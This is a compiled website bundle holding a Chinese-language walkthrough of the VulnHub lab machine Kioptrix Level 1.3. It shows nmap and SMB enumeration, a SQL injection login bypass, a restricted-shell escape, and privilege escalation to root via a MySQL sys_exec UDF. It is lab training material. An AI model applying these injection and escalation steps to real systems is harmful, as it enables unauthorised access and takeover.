"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[5991],{8266:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>u,frontMatter:()=>t,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/Kioptrix Level 1.3","title":"Kioptrix Level 1.3","description":"\u7aef\u53e3\u626b\u63cf","source":"@site/docs/VulnHub/Virtual Machines/Kioptrix Level 1.3.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/Kioptrix Level 1.3","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix Level 1.3","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/Kioptrix Level 1.3.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Kioptrix Level 1.2","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix Level 1.2"},"next":{"title":"Kioptrix Level 1","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix Level 1"}}');var o=r(4848),i=r(8453);const t={},a=void 0,l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"\u626b\u63cfsmb\u6f0f\u6d1e",id:"\u626b\u63cfsmb\u6f0f\u6d1e",level:3},{value:"web\u7aef\u6e17\u900f",id:"web\u7aef\u6e17\u900f",level:3},{value:"SSH\u767b\u5f55",id:"ssh\u767b\u5f55",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"UDF\u63d0\u6743",id:"udf\u63d0\u6743",level:3}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Tue Nov  5 10:24:55 2024 as: nmap -sT --min-rate 10000 -p- -oN nmapscan/port_scan 192.168.217.142\r\nNmap scan report for 192.168.217.142\r\nHost is up (0.00093s latency).\r\nNot shown: 39528 closed tcp ports (conn-refused), 26003 filtered tcp ports (no-response)\r\nPORT    STATE SERVICE\r\n22/tcp  open  ssh\r\n80/tcp  open  http\r\n139/tcp open  netbios-ssn\r\n445/tcp open  microsoft-ds\r\nMAC Address: 00:0C:29:5D:77:E0 (VMware)\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Tue Nov  5 10:25:31 2024 as: nmap -sT -sV -sC -O -p22,80,139,445 -v -oN nmapscan/detail_scan 192.168.217.142\r\nNmap scan report for 192.168.217.142\r\nHost is up (0.0013s latency).\r\n\r\nPORT    STATE SERVICE     VERSION\r\n22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)\r\n|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)\r\n80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)\r\n|_http-title: Site doesn't have a title (text/html).\r\n|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\r\n| http-methods: \r\n|_  Supported Methods: GET HEAD POST OPTIONS\r\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r\n445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)\r\nMAC Address: 00:0C:29:5D:77:E0 (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 2.6.X\r\nOS CPE: cpe:/o:linux:linux_kernel:2.6\r\nOS details: Linux 2.6.9 - 2.6.33\r\nUptime guess: 497.101 days (since Tue Jun 27 09:00:18 2023)\r\nNetwork Distance: 1 hop\r\nTCP Sequence Prediction: Difficulty=200 (Good luck!)\r\nIP ID Sequence Generation: All zeros\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nHost script results:\r\n|_smb2-time: Protocol negotiation failed (SMB2)\r\n| smb-security-mode: \r\n|   account_used: guest\r\n|   authentication_level: user\r\n|   challenge_response: supported\r\n|_  message_signing: disabled (dangerous, but default)\r\n| smb-os-discovery: \r\n|   OS: Unix (Samba 3.0.28a)\r\n|   Computer name: Kioptrix4\r\n|   NetBIOS computer name: \r\n|   Domain name: localdomain\r\n|   FQDN: Kioptrix4.localdomain\r\n|_  System time: 2024-11-05T18:25:44-05:00\r\n|_clock-skew: mean: 10h29m59s, deviation: 3h32m07s, median: 7h59m59s\r\n| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\r\n| Names:\r\n|   KIOPTRIX4<00>        Flags: <unique><active>\r\n|   KIOPTRIX4<03>        Flags: <unique><active>\r\n|   KIOPTRIX4<20>        Flags: <unique><active>\r\n|   WORKGROUP<1e>        Flags: <group><active>\r\n|_  WORKGROUP<00>        Flags: <group><active>\n"})}),"\n",(0,o.jsx)(n.h3,{id:"\u626b\u63cfsmb\u6f0f\u6d1e",children:"\u626b\u63cfsmb\u6f0f\u6d1e"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"nmap -p 139 --script=*smb* -oN nmapscan/smb_scan 192.168.217.142\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"|_smb-mbenum: ERROR: Script execution failed (use -d to debug)\r\n| smb-enum-users: \r\n|   KIOPTRIX4\\john (RID: 3002)\r\n|     Full name:   ,,,\r\n|     Flags:       Normal user account\r\n|   KIOPTRIX4\\loneferret (RID: 3000)\r\n|     Full name:   loneferret,,,\r\n|     Flags:       Normal user account\r\n|   KIOPTRIX4\\nobody (RID: 501)\r\n|     Full name:   nobody\r\n|     Flags:       Normal user account\r\n|   KIOPTRIX4\\robert (RID: 3004)\r\n|     Full name:   ,,,\r\n|     Flags:       Normal user account\r\n|   KIOPTRIX4\\root (RID: 1000)\r\n|     Full name:   root\r\n|_    Flags:       Normal user account\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u53ef\u4ee5\u627e\u5230\u51e0\u4e2a\u7528\u6237\uff1a",(0,o.jsx)(n.code,{children:"john\u3001loneferret\u3001robert\u3001root"})]}),"\n",(0,o.jsxs)(n.p,{children:["\u5229\u7528",(0,o.jsx)(n.code,{children:"enum4linux"}),",\u540c\u6837\u53ef\u4ee5\u5f97\u5230"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"enum4linux -U 192.168.217.142\n"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107114520150.png",alt:"image-20241107114520150"})}),"\n",(0,o.jsx)(n.h3,{id:"web\u7aef\u6e17\u900f",children:"web\u7aef\u6e17\u900f"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107114637421.png",alt:"image-20241107114637421"})}),"\n",(0,o.jsx)(n.p,{children:"Password\u5904\u6709\u4e07\u80fd\u5bc6\u7801"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.code,{children:"' or 1=1--+'"})}),"\n",(0,o.jsx)(n.p,{children:"\u767b\u5f55john\uff0crobert\u7528\u6237"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107115243130.png",alt:"image-20241107115243130"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107115506386.png",alt:"image-20241107115506386"})}),"\n",(0,o.jsx)(n.p,{children:"\u62ff\u5230\u5bc6\u7801"}),"\n",(0,o.jsx)(n.h3,{id:"ssh\u767b\u5f55",children:"SSH\u767b\u5f55"}),"\n",(0,o.jsx)(n.p,{children:"\u73b0\u5728\u53c8\u4e24\u5bf9\u51ed\u636e\uff0c\u5c1d\u8bd5\u8fdb\u884cSSH\u767b\u5f55"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"ssh robert@192.168.217.142\n"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107115731217.png",alt:"image-20241107115731217"})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"LigGoat Shell "}),"\u662f\u4e00\u4e2a\u53d7\u9650\u7684shell\u73af\u5883\uff0c\u53ea\u53ef\u4ee5\u6267\u884c\u51e0\u4e2a\u547d\u4ee4"]}),"\n",(0,o.jsxs)(n.p,{children:["\u5982\u4f55\u7ed5\u8fc7 ",(0,o.jsx)(n.code,{children:"LigGoat Shell"})," \u7684\u9650\u5236\uff1f"]}),"\n",(0,o.jsxs)(n.blockquote,{children:["\n",(0,o.jsxs)(n.p,{children:["\u5229\u7528",(0,o.jsx)(n.code,{children:"echo"}),"\u547d\u4ee4\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff1a\u5728\u67d0\u4e9b\u53d7\u9650\u7684shell\u73af\u5883\u4e2d\uff0c",(0,o.jsx)(n.code,{children:"echo"}),"\u547d\u4ee4\u53ef\u80fd\u88ab\u5141\u8bb8\u6267\u884c\u3002\u53ef\u4ee5\u901a\u8fc7",(0,o.jsx)(n.code,{children:"echo"}),"\u547d\u4ee4\u914d\u5408\u5176\u4ed6\u6280\u5de7\u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u4f8b\u5982",(0,o.jsx)(n.code,{children:"echo os.system('/bin/bash')"})]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.a,{href:"https://www.aldeid.com/wiki/Lshell",children:"https://www.aldeid.com/wiki/Lshell"})}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"\u62ff\u5230\u4e00\u4e2a\u5b8c\u6574\u7684shell\uff0c\u63a5\u7740\u5c31\u662f\u63d0\u6743"}),"\n",(0,o.jsx)(n.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'robert@Kioptrix4:~$ uname -a\r\nLinux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux\r\nrobert@Kioptrix4:~$ cat /etc/*release\r\nDISTRIB_ID=Ubuntu\r\nDISTRIB_RELEASE=8.04\r\nDISTRIB_CODENAME=hardy\r\nDISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u8fd9\u91cc\u6211\u6ca1\u6709\u627e\u5230\u53ef\u4ee5\u63d0\u6743\u7684\u65b9\u6848"}),"\n",(0,o.jsx)(n.h3,{id:"udf\u63d0\u6743",children:"UDF\u63d0\u6743"}),"\n",(0,o.jsx)(n.p,{children:"\u53bb\u770bweb\u76ee\u5f55\u4e0b\u6536\u96c6\u4fe1\u606f"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'robert@Kioptrix4:/var/www$ cat checklogin.php \r\n<?php\r\nob_start();\r\n$host="localhost"; // Host name\r\n$username="root"; // Mysql username\r\n$password=""; // Mysql password\r\n$db_name="members"; // Database name\r\n$tbl_name="members"; // Table name\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u8fd9\u91ccroot\u7528\u6237\u7684\u5bc6\u7801\u4e3a\u7a7a"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"robert@Kioptrix4:/var/www$ mysql -uroot\r\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\r\nYour MySQL connection id is 49\r\nServer version: 5.0.51a-3ubuntu5.4 (Ubuntu)\r\n\r\nType 'help;' or '\\h' for help. Type '\\c' to clear the buffer.\r\n\r\nmysql> select user();\r\n+----------------+\r\n| user()         |\r\n+----------------+\r\n| root@localhost | \r\n+----------------+\r\n1 row in set (0.00 sec)\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u67e5\u770b\u7528\u6237\u5b9a\u4e49\u51fd\u6570\uff08UDF\uff09\u4fe1\u606f"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-mysql",children:"mysql> select * from mysql.func;\r\n+-----------------------+-----+---------------------+----------+\r\n| name                  | ret | dl                  | type     |\r\n+-----------------------+-----+---------------------+----------+\r\n| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | \r\n| sys_exec              |   0 | lib_mysqludf_sys.so | function | \r\n+-----------------------+-----+---------------------+----------+\r\n2 rows in set (0.00 sec)\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u6dfb\u52a0\u8fdb",(0,o.jsx)(n.code,{children:"admin"}),"\u7ec4"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"usermod -a -G admin john\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u79fb\u9664\uff1a",(0,o.jsx)(n.code,{children:'usermod -G "" john'})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-mysql",children:"mysql> select sys_exec('usermod -a -G admin john');\r\n+--------------------------------------+\r\n| sys_exec('usermod -a -G admin john') |\r\n+--------------------------------------+\r\n| NULL                                 | \r\n+--------------------------------------+\r\n1 row in set (0.04 sec)\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"john@Kioptrix4:~$ id\r\nuid=1001(john) gid=1001(john) groups=115(admin),1001(john)\r\njohn@Kioptrix4:~$ sudo -l\r\n[sudo] password for john: \r\nUser john may run the following commands on this host:\r\n    (ALL) ALL\r\njohn@Kioptrix4:~$ sudo bash\r\nroot@Kioptrix4:~# id\r\nuid=0(root) gid=0(root) groups=0(root)\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u6210\u529f\u62ff\u5230root"}),"\n",(0,o.jsxs)(n.blockquote,{children:["\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.a,{href:"https://blog.csdn.net/2301_76227305/article/details/139545193",children:"MySQL\u63d0\u6743\u4e4bUDF\u63d0\u6743"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.a,{href:"https://www.doyler.net/security-not-included/kioptrix-level-1-3-4-walkthrough",children:"Kioptrix Level 1.3 (#4) Walkthrough"})}),"\n"]})]})}function u(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>t,x:()=>a});var s=r(6540);const o={},i=s.createContext(o);function t(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:t(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);